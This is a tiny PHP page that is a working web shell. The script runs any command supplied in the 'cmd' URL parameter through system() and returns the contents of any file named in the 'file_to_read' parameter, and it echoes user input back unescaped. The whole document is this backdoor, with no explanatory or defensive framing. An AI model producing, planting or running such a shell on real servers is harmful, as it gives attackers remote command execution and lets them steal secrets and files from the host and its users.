<html>
<body>

<?php  
    echo "Hello, ";
    echo "<br><br>\n\n";

    if (isset($_GET['cmd']))  {
        echo "Running [". $_GET['cmd'] . "] <br><br>\n";
        system($_GET['cmd']);
        
    } elseif (isset($_GET['file_to_read']) )  {
        echo "Reading ". $_GET['file_to_read'];
        echo file_get_contents($_GET['file_to_read']);

    } else {
        echo "Error: This script requires 'cmd' or 'file_to_read'  parameter.";
    }

?>  

</body>
</html>
